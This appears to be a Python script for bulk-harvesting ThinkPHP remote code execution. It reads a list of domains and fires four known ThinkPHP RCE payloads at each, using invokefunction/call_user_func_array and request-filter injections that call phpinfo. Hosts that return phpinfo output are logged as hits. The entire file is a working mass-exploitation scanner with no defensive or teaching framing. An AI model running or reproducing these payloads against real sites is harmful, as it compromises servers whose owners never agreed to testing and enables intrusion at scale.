#!/usr/bin/env python3
"""ThinkPHP批量RCE收割"""
import urllib.request, socket

UA = {"User-Agent":"Mozilla/5.0"}

def check_tp(domain):
    base = "http://" + domain
    payloads = [
        "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
        "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
        "/index.php?s=captcha&_method=__construct&filter[]=phpinfo",
        "/?s=index/\\think\\Request/input&filter[]=phpinfo&data=1",
    ]
    for p in payloads:
        try:
            url = base + p.replace("\\", "%5C")
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=6).read()
            if b"PHP Version" in r[:5000] or b"phpinfo()" in r[:5000]:
                return p
        except:
            pass
    return None

def main():
    domains = [l.strip() for l in open("/tmp/tp_domains.txt") if l.strip()]
    hits = []
    for d in domains[:300]:
        r = check_tp(d)
        if r:
            print(f"[TP-RCE!!] {d} {r}")
            hits.append(d + " " + r)
    print(f"DONE: {len(hits)} hits")
    with open("/tmp/tp_hits.txt", "a") as f:
        for h in hits: f.write(h + "\n")

if __name__ == "__main__":
    main()
